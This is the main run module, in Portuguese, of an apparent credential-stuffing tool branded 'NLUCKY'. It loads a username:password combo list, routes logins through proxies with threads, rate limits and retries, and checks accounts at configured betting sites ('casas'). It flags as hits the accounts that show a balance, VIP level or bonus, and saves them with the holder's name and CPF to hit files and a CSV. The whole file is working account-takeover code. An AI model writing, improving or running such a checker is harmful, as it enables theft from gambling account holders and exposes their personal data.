// run.js v11 — timeout por conta, watchdog, HIT só com dado real + branding Nlucky, deepCheck, HTML, Q/parar.js
import fs from "fs";
import path from "path";
import { exec } from "child_process";
import { ROOT } from "./paths.js";
import { loadCasas, loadConfig } from "./storage.js";
import { loadProxies, getProxyCount } from "./proxy.js";
import { startTlsProxy } from "./tls.js";
import { fullCheck } from "./login.js";
import { setRateLimit } from "./trpc.js";
import { runPool } from "./pool.js";
import { banner, prompt, separator, c } from "./ui.js";
import { sendDesktopNotification } from "./notification.js";
import { verificarBonus } from "./deepCheck.js";
import { iniciarRelatorio, registrar, finalizarRelatorio } from "./report.js";
import { criarParada } from "./stop.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── prazos ───────────────────────────────────────────────────────────────
const LIMITE_CHECK = 75000;   // conta inteira
const LIMITE_BONUS = 25000;   // deepCheck
const LIMITE_TRAVA = 120000;  // watchdog: sem progresso real
const INTERVALO_SOM = 3000;   // anti-tempestade de powershell

class TimeoutConta extends Error {}

const comPrazo = (promise, ms) =>
  Promise.race([
    promise,
    sleep(ms).then(() => {
      throw new TimeoutConta(`timeout ${Math.round(ms / 1000)}s`);
    }),
  ]);

function sliceAnsi(str, limit) {
  let visible = 0;
  let out = "";
  let i = 0;
  while (i < str.length && visible < limit) {
    if (str[i] === "\x1b") {
      const m = str.slice(i).match(/^\x1b\[[0-9;]*[a-zA-Z]/);
      if (m) { out += m[0]; i += m[0].length; continue; }
    }
    out += str[i];
    visible++;
    i++;
  }
  return out.endsWith("\x1b[0m") ? out : out + "\x1b[0m";
}

let header = "";
const falhas = [];

const brl = (v) => {
  const n = Number(v);
  if (v === null || v === undefined || !Number.isFinite(n)) return "?";
  return `R$ ${n.toFixed(2).replace(".", ",")}`;
};

const vipTxt = (r) => (r.vipLabel ? r.vipLabel : r.vip !== null && r.vip !== undefined ? String(r.vip) : "?");

let ultimoSom = 0;
function tocarSom() {
  const agora = Date.now();
  if (agora - ultimoSom < INTERVALO_SOM) return;
  ultimoSom = agora;
  exec("powershell -c (New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Speech On.wav').PlaySync()", () => {});
}

function limparConta(linha) {
  return String(linha)
    .replace(/\ufeff/g, "")
    .replace(/[\u200b\u200c\u200d\u2060\u00a0\t]/g, " ")
    .replace(/\s*:\s*/g, ":")
    .replace(/\s{2,}/g, " ")
    .trim();
}

let ultimoDraw = 0;
function draw(stats, info, forcar = false) {
  const agora = Date.now();
  if (!forcar && agora - ultimoDraw < 100) return;
  ultimoDraw = agora;
  try {
    const pct = info.total > 0 ? Math.min(100, Math.floor((info.done / info.total) * 100)) : 0;
    const filled = Math.max(0, Math.min(10, Math.floor((pct / 100) * 10)));
    const bar = "█".repeat(filled) + "░".repeat(10 - filled);
    const cols = Math.max(40, process.stdout.columns || 80);
    const line =
      `  ${c.ACCENT2}${bar}${c.RESET} ${pct}% ${c.DIM}│${c.RESET} ${info.done}/${info.total} ${c.DIM}│${c.RESET} ` +
      `${c.GREEN}hits:${stats.hits}${c.RESET} ${c.MAGENTA}bonus:${stats.bonus}${c.RESET} ${c.YELLOW}ss:${stats.ss}${c.RESET} ${c.R}proib:${stats.proib}${c.RESET} ` +
      `${c.DIM}bad:${stats.bad} nf:${stats.nf} unk:${stats.unk} err:${stats.err}${c.RESET}` +
      (info.parado ? ` ${c.R}⏹ parando${c.RESET}` : "");
    process.stdout.write(
      `\u001b[s\u001b[1;1H\u001b[K${sliceAnsi(header, cols - 1)}\n\u001b[2;1H\u001b[K${sliceAnsi(line, cols - 1)}\n\u001b[3;1H\u001b[K  ${c.DIM}${"─".repeat(cols - 4)}${c.RESET}\u001b[u`,
    );
  } catch {}
}

function log(msg) {
  try { process.stdout.write(msg + "\n"); } catch {}
}

let txtAtivo = false;

function appendSafe(file, texto) {
  if (!txtAtivo) return;
  try {
    fs.appendFileSync(file, texto, "utf-8");
  } catch (e) {
    falhas.push(`[arquivo] ${path.basename(file)}: ${e.message}`);
  }
}

const CLASS_TO_BUCKET = {
  NAO_EXISTE: "nf",
  SENHA_ERRADA: "bad",
  PROIBIDA: "proib",
  CAPTCHA: "unk",
  INCONCLUSIVO: "unk",
  ERRO: "err",
  BLOQUEIO: "unk",
  SCHEMA: "unk",
  RATE: "unk",
};

const RETRY_STATUS = new Set(["INCONCLUSIVO", "CAPTCHA", "ERRO", "BLOQUEIO", "RATE"]);

function tipoDe(report, config) {
  if (report.bonus?.hit) return "bonus";
  if (report.status === "PROIBIDA") return "proibida";
  if (report.status === "LOGIN_OK") {
    const saldoOk = report.saldo !== null && report.saldo >= config.minBalance;
    const vipOk = report.vip !== null && report.vip >= config.minVip;
    if (!saldoOk && !vipOk && report.saldo === null && report.vip === null) return "inconclusivo";
    return saldoOk || vipOk ? "hit" : "sem_saldo";
  }
  if (report.status === "SENHA_ERRADA") return "senha";
  if (report.status === "NAO_EXISTE") return "nao_existe";
  if (report.status === "CAPTCHA") return "captcha";
  return "inconclusivo";
}

export async function cmdRun() {
  const casas = loadCasas();
  const nomes = Object.keys(casas);
  if (nomes.length === 0) {
    console.log("\n  Nenhuma casa cadastrada.\n");
    return;
  }

  const config = loadConfig();
  const escopo = await prompt("  Casa (nome) ou ENTER para TODAS: ");
  const alvo = escopo ? [escopo] : nomes;
  const invalidas = alvo.filter((n) => !casas[n]);
  if (invalidas.length) {
    console.error(`❌ Não encontrada(s): ${invalidas.join(", ")}`);
    return;
  }

  const threadsStr = await prompt(`  Threads ${c.DIM}[${config.threads}]${c.RESET}: `);
  const threads = Math.min(50, Math.max(1, parseInt(threadsStr || config.threads, 10) || 1));
  const delayStr = await prompt(`  Delay entre requisições em ms ${c.DIM}[${config.delay || 90}]${c.RESET}: `);
  const delay = Math.max(0, parseInt(delayStr || config.delay || 90, 10) || 0);
  const repescagemStr = await prompt(`  Passadas de repescagem ${c.DIM}[2]${c.RESET}: `);
  const repescagens = Math.min(5, Math.max(0, parseInt(repescagemStr || 2, 10) || 0));
  const filtroStr = await prompt(`  Só números com 9 no 3º dígito ${c.DIM}[${config.filtro9 ? "S" : "n"}]${c.RESET}: `);
  const filtro9 = (filtroStr || (config.filtro9 ? "s" : "n")).toLowerCase() !== "n";
  const arquivo = (await prompt(`  Arquivo de contas ${c.DIM}[contas.txt]${c.RESET}: `)) || path.join(ROOT, "contas.txt");

  if (!fs.existsSync(arquivo)) {
    fs.writeFileSync(arquivo, "usuario:senha\n");
    console.log(`  📄 ${arquivo} criado. Preencha e rode de novo.\n`);
    return;
  }

  const vistos = new Set();
  const contas = [];
  let duplicadas = 0;
  let ignoradas = 0;
  for (const bruta of fs.readFileSync(arquivo, "utf-8").split(/\r?\n/)) {
    const linha = limparConta(bruta);
    if (!linha.includes(":")) continue;
    const idx = linha.indexOf(":");
    const usuario = linha.slice(0, idx).trim();
    const senha = linha.slice(idx + 1).trim();
    if (!usuario || !senha) continue;
    if (filtro9 && /^\d{11}$/.test(usuario) && usuario[2] !== "9") { ignoradas++; continue; }
    const chave = `${usuario.toLowerCase()}:${senha}`;
    if (vistos.has(chave)) { duplicadas++; continue; }
    vistos.add(chave);
    contas.push(`${usuario}:${senha}`);
  }

  if (contas.length === 0) {
    console.log("  Nenhuma conta válida no arquivo.\n");
    return;
  }

  loadProxies(path.join(ROOT, "proxy.txt"));
  const proxyCount = getProxyCount();
  banner();
  console.log(`  ${c.ACCENT}▍${c.RESET} ${c.B}${contas.length}${c.RESET} contas únicas ${c.DIM}(${duplicadas} duplicadas)${c.RESET}`);
  if (ignoradas > 0) console.log(`  ${c.DIM}🔎 ${ignoradas} ignoradas — 3º dígito ≠ 9${c.RESET}`);
  console.log(proxyCount ? `  🌐 ${proxyCount} proxies` : `  ${c.DIM}🌐 sem proxy${c.RESET}`);
  if (proxyCount > 0 && threads > proxyCount * 2) {
    console.log(`  ${c.YELLOW}⚠ ${threads} threads para ${proxyCount} proxies — considere ${Math.max(4, proxyCount)}${c.RESET}`);
  }
  const casasComDeep = alvo.filter((n) => casas[n].deepCheck?.enabled).length;
  if (casasComDeep) console.log(`  ${c.MAGENTA}🔎 verificação profunda ativa em ${casasComDeep} casa(s)${c.RESET}`);
  await startTlsProxy();
  setRateLimit(delay);

  const hitsDir = path.join(ROOT, "hits");
  if (!fs.existsSync(hitsDir)) fs.mkdirSync(hitsDir);
  const csvFile = path.join(hitsDir, "saidas.csv");
  if (!fs.existsSync(csvFile)) {
    fs.writeFileSync(csvFile, "casa;conta;saldo;vip;nome;status;bonus;bonusItens;data\n", "utf-8");
  }

  const arquivosPorCasa = new Map();
  for (const nome of alvo) {
    const hitsFile = path.join(hitsDir, `hits_${nome}.txt`);
    if (!fs.existsSync(hitsFile)) {
      try {
        fs.writeFileSync(hitsFile, `=== ${nome} (${casas[nome].domain}) — ${new Date().toLocaleString()} ===\n`, "utf-8");
      } catch (e) {
        falhas.push(`[arquivo] hits_${nome}.txt: ${e.message}`);
      }
    }
    arquivosPorCasa.set(nome, hitsFile);
  }

  const stats = { hits: 0, bonus: 0, ss: 0, proib: 0, bad: 0, nf: 0, unk: 0, err: 0 };
  const resultados = new Map();
  const pares = [];
  for (const nome of alvo) for (const conta of contas) pares.push({ nome, conta });

  const totalGeral = pares.length;
  let concluidas = 0;
  let pendentesAtual = 0;
  let finalizado = false;
  let forcado = false;

  txtAtivo = !!config.txtDetalhado;
  iniciarRelatorio(alvo);

  process.stdout.write("\u001b[2J\u001b[H\u001b[4;r\u001b[4;1H");
  header = `  ${c.ACCENT2}${c.B}NLUCKY${c.RESET} ${c.DIM}│${c.RESET} casas:${alvo.length} contas:${contas.length} threads:${threads} delay:${delay}ms ${c.DIM}│ Q ou parar.js p/ parar${c.RESET}`;

  const parada = criarParada(() => draw(stats, { done: concluidas, total: totalGeral, parado: true }, true));

  // ── watchdog: se nada concluir em LIMITE_TRAVA, solta o pool ────────────
  let marcaConcluidas = concluidas;
  let marcaTempo = Date.now();
  const vigia = setInterval(() => {
    if (concluidas !== marcaConcluidas) {
      marcaConcluidas = concluidas;
      marcaTempo = Date.now();
      return;
    }
    if (finalizado || forcado || parada.parado()) return;
    if (Date.now() - marcaTempo < LIMITE_TRAVA) return;
    forcado = true;
    process.stdout.write(`\n  ${c.R}⚠ ${LIMITE_TRAVA / 1000}s sem progresso — encerrando o que travou${c.RESET}\n`);
  }, 5000);

  const aoSair = () => {
    if (finalizado) return;
    try {
      process.stderr.write(`\n  ⚠️  Encerrado antes do fim. Concluídas: ${concluidas}/${totalGeral}\n`);
    } catch {}
  };
  process.on("exit", aoSair);
  const sigint = () => { process.stdout.write("\u001b[r\n"); process.exit(0); };
  process.on("SIGINT", sigint);

  const originalLog = console.log;
  const originalErr = console.error;
  console.log = () => {};
  console.error = (...a) => log(`  ${c.R}${a.join(" ")}${c.RESET}`);

  const deveParar = () => parada.parado() || forcado;

  async function executarPassada(lista, threadsPassada, delayPassada, passe) {
    setRateLimit(delayPassada);
    const tarefas = lista.map(({ nome, conta }) => async () => {
      if (deveParar()) return;

      const chave = `${nome}|${conta}`;
      let report = null;
      let abandonada = false;

      try {
        const idx = conta.indexOf(":");
        report = await comPrazo(
          fullCheck(casas[nome], nome, conta.slice(0, idx).trim(), conta.slice(idx + 1).trim()),
          LIMITE_CHECK,
        );

        if (report.status === "LOGIN_OK" && casas[nome].deepCheck?.enabled) {
          const token = report.authTag || report.token;
          if (token) {
            try {
              report.bonus = await comPrazo(
                verificarBonus({ casa: casas[nome], token, deviceId: report.deviceId, traceId: report.traceId }),
                LIMITE_BONUS,
              );
            } catch {
              report.bonus = { ok: false };
            }
          }
        }
      } catch (e) {
        abandonada = true;
        if (e instanceof TimeoutConta) {
          stats.unk++;
          resultados.set(chave, "INCONCLUSIVO");
          log(`${c.YELLOW}[⏱ ${report?.status || "TIMEOUT"}]${c.RESET} ${nome} │ ${conta} │ ${e.message}`);
          registrar({ casa: nome, conta, tipo: "inconclusivo", status: "INCONCLUSIVO", detalhe: e.message });
          appendSafe(path.join(hitsDir, `completo_${nome}.txt`), `${conta} | TIMEOUT | ? | saldo=? | p${passe} | ${e.message}\n`);
        } else {
          stats.err++;
          resultados.set(chave, "ERRO");
          falhas.push(`${nome} | ${conta} | ${e.message}`);
          log(`${c.R}[💥 ERRO]${c.RESET} ${nome} │ ${conta} │ ${e.message}`);
          registrar({ casa: nome, conta, tipo: "erro", status: "ERRO", detalhe: e.message });
          appendSafe(path.join(hitsDir, `completo_${nome}.txt`), `${conta} | ERRO | ? | saldo=? | p${passe} | ${e.message}\n`);
        }
      } finally {
        concluidas++;
        draw(stats, { done: concluidas, total: totalGeral, passe, pendentes: pendentesAtual, parado: parada.parado() });
      }

      if (abandonada || !report) return;

      try {
        const saldoTxt = brl(report.saldo);
        const vip = vipTxt(report);
        const hitsFile = arquivosPorCasa.get(nome) || path.join(hitsDir, `hits_${nome}.txt`);
        const bonus = report.bonus;
        const temDado = report.saldo !== null || report.vip !== null;

        // ── login ok mas perfil não respondeu: inconclusivo, não HIT ─────
        if (report.status === "LOGIN_OK" && !temDado) {
          stats.unk++;
          resultados.set(chave, "INCONCLUSIVO");
          log(`${c.YELLOW}[? PERFIL]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} login ok, sem saldo/vip`);
          registrar({ casa: nome, conta: report.conta, tipo: "inconclusivo", status: "INCONCLUSIVO", detalhe: "perfil sem saldo/vip" });
          appendSafe(path.join(hitsDir, `completo_${nome}.txt`), `${report.conta} | SEM PERFIL | ? | saldo=? | p${passe} | login ok\n`);
          return;
        }

        if (report.status === "LOGIN_OK" || report.status === "PROIBIDA") {
          const proibida = report.status === "PROIBIDA";

          if (bonus?.hit) {
            const itensTxt = bonus.itens.map((i) => `${i.activeName || "?"}(${i.reward ?? "?"})`).join(" / ");
            stats.bonus++;
            log(
              `${c.MAGENTA}[🎁 BÔNUS]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ` +
                `${bonus.total}x ${c.DIM}│${c.RESET} soma=${brl(bonus.somaTotal)} ${c.DIM}│${c.RESET} saldo=${saldoTxt}${proibida ? ` ${c.R}│ PROIBIDA${c.RESET}` : ""}`,
            );
            appendSafe(hitsFile, `${report.conta} | BONUS ${bonus.total}x soma=${bonus.somaTotal} | saldo=${saldoTxt} | ${itensTxt}\n`);
            appendSafe(
              csvFile,
              `${nome};${report.conta};${report.saldo ?? ""};${report.vip ?? ""};${report.nome};BONUS;${bonus.somaTotal};${itensTxt};${new Date().toISOString()}\n`,
            );
            if (config.sound) tocarSom();
            if (config.notify) sendDesktopNotification(nome, `bônus ${brl(bonus.somaTotal)} | saldo=${saldoTxt}`, report.conta);
          } else {
            const saldoOk = report.saldo !== null && report.saldo >= config.minBalance;
            const vipOk = report.vip !== null && report.vip >= config.minVip;
            const relevante = proibida || saldoOk || vipOk;
            const semBonus = bonus?.ok ? ` ${c.DIM}│ sem bônus${c.RESET}` : "";

            if (relevante && !proibida) {
              stats.hits++;
              log(`${c.GREEN}[✅ HIT]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ${vip} ${c.DIM}│${c.RESET} saldo=${saldoTxt}${semBonus}`);
              appendSafe(hitsFile, `${report.conta} | ${vip} | saldo=${saldoTxt}\n`);
              appendSafe(
                csvFile,
                `${nome};${report.conta};${report.saldo ?? ""};${report.vip ?? ""};${report.nome};${report.status};;;${new Date().toISOString()}\n`,
              );
              if (config.sound && saldoOk) tocarSom();
              if (config.notify) sendDesktopNotification(nome, saldoTxt, report.conta);
            } else if (proibida) {
              stats.proib++;
              log(`${c.R}[🚫 PROIBIDA]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ${vip} ${c.DIM}│${c.RESET} saldo=${saldoTxt}`);
              appendSafe(hitsFile, `${report.conta} | PROIBIDA | ${vip} | saldo=${saldoTxt}\n`);
              appendSafe(
                csvFile,
                `${nome};${report.conta};${report.saldo ?? ""};${report.vip ?? ""};${report.nome};PROIBIDA;;;${new Date().toISOString()}\n`,
              );
            } else {
              stats.ss++;
              log(`${c.YELLOW}[⚠️ SEM SALDO]${c.RESET} ${nome} ${c.DIM}│${c.RESET} ${report.conta} ${c.DIM}│${c.RESET} ${vip} ${c.DIM}│${c.RESET} saldo=${saldoTxt}${semBonus}`);
              appendSafe(hitsFile, `${report.conta} | SEM SALDO | ${vip} | saldo=${saldoTxt}\n`);
            }
          }
        } else {
          const bucket = CLASS_TO_BUCKET[report.status] || "unk";
          stats[bucket]++;
          if (bucket === "unk") log(`${c.DIM}[? ${report.status}] ${nome} │ ${report.conta} │ ${report.detalhe}${c.RESET}`);
          if (bucket === "err") log(`${c.R}[💥 ${report.status}]${c.RESET} ${nome} │ ${report.conta} │ ${report.detalhe}`);
        }

        resultados.set(chave, report.status);

        registrar({
          casa: nome,
          conta: report.conta,
          tipo: tipoDe(report, config),
          status: report.status,
          saldo: report.saldo,
          vip: report.vip,
          vipLabel: report.vipLabel,
          nome: report.nome,
          cpf: report.cpf,
          bonus: report.bonus,
          detalhe: report.detalhe,
        });

        appendSafe(
          path.join(hitsDir, `completo_${nome}.txt`),
          `${report.conta} | ${report.status} | ${vip} | saldo=${saldoTxt} | p${passe} | bonus=${bonus?.hit ? `${bonus.total}x/${bonus.somaTotal}` : "-"} | ${report.detalhe}\n`,
        );
      } catch (e) {
        stats.err++;
        resultados.set(chave, "ERRO");
        falhas.push(`${nome} | ${conta} | ${e.message}`);
        log(`${c.R}[💥 ERRO]${c.RESET} ${nome} │ ${conta} │ ${e.message}`);
      }
    });

    await runPool(tarefas, threadsPassada, delayPassada > 0 ? Math.floor(delayPassada / threadsPassada) : 0);
  }

  try {
    await executarPassada(pares, threads, delay, 0);

    for (let passe = 1; passe <= repescagens; passe++) {
      if (deveParar()) break;

      const pendentes = pares.filter((p) => RETRY_STATUS.has(resultados.get(`${p.nome}|${p.conta}`)));
      if (pendentes.length === 0) break;

      pendentesAtual = pendentes.length;
      const espera = 4000 + passe * 3000;
      process.stdout.write(`\u001b[4;1H\u001b[K  ${c.YELLOW}↻ Repescagem ${passe}/${repescagens}: ${pendentes.length} pendentes — aguardando ${Math.round(espera / 1000)}s${c.RESET}\n`);
      await sleep(espera);
      if (deveParar()) break;

      for (const p of pendentes) {
        const st = resultados.get(`${p.nome}|${p.conta}`);
        const b = CLASS_TO_BUCKET[st];
        if (b && stats[b] > 0) stats[b]--;
      }

      const tRetry = Math.max(1, Math.min(threads, 8));
      const dRetry = Math.max(delay, 150 + passe * 120);
      await executarPassada(pendentes, tRetry, dRetry, passe);
    }
  } catch (e) {
    falhas.push(`[pool] ${e.message}`);
  } finally {
    finalizado = true;
    pendentesAtual = 0;
    clearInterval(vigia);
    parada.encerrar();
    process.removeListener("SIGINT", sigint);
    process.removeListener("exit", aoSair);
    process.stdout.write("\u001b[r");
    process.stdout.write(`\u001b[${process.stdout.rows || 24};1H\n`);
    console.log = originalLog;
    console.error = originalErr;
  }

  const pendentesFinal = pares.filter((p) => RETRY_STATUS.has(resultados.get(`${p.nome}|${p.conta}`)));

  separator();
  if (parada.parado() || forcado) {
    const motivo = forcado ? "watchdog" : parada.motivo();
    console.log(`  ${c.R}⏹ parado por ${motivo} — ${concluidas}/${totalGeral} percorridas${c.RESET}`);
    console.log();
  }
  console.log(`  ${c.GREEN}hits:${c.RESET} ${stats.hits}   ${c.MAGENTA}bônus:${c.RESET} ${stats.bonus}   ${c.YELLOW}sem saldo:${c.RESET} ${stats.ss}   ${c.R}proibida:${c.RESET} ${stats.proib}   senha errada: ${stats.bad}   não existe: ${stats.nf}   inconclusivo: ${stats.unk}   erro: ${stats.err}`);
  console.log(`  ${c.DIM}total percorrido: ${concluidas}/${totalGeral}${c.RESET}`);
  if (pendentesFinal.length) {
    console.log(`  ${c.R}⚠️  ${pendentesFinal.length} contas continuaram sem resposta depois de ${repescagens} repescagem(ns).${c.RESET}`);
    console.log(`     ${c.DIM}rode de novo com menos threads / delay maior para recuperar essas.${c.RESET}`);
  }
  separator();
  if (falhas.length) {
    console.log(`  ${c.R}Falhas (${falhas.length}):${c.RESET}`);
    for (const f of falhas.slice(0, 30)) console.log(`   ${c.DIM}-${c.RESET} ${f}`);
    if (falhas.length > 30) console.log(`   ${c.DIM}... +${falhas.length - 30}${c.RESET}`);
    console.log();
  }
  try {
    const relatorio = finalizarRelatorio();
    console.log(`  📊 Relatório: ${relatorio}`);
    exec(`start "" "${relatorio}"`);
  } catch (e) {
    console.log(`  ⚠️ relatório falhou: ${e.message}`);
  }
  console.log(`  📄 CSV: ${csvFile}`);
  console.log(`  📁 Hits por casa em: ${hitsDir}\n`);
}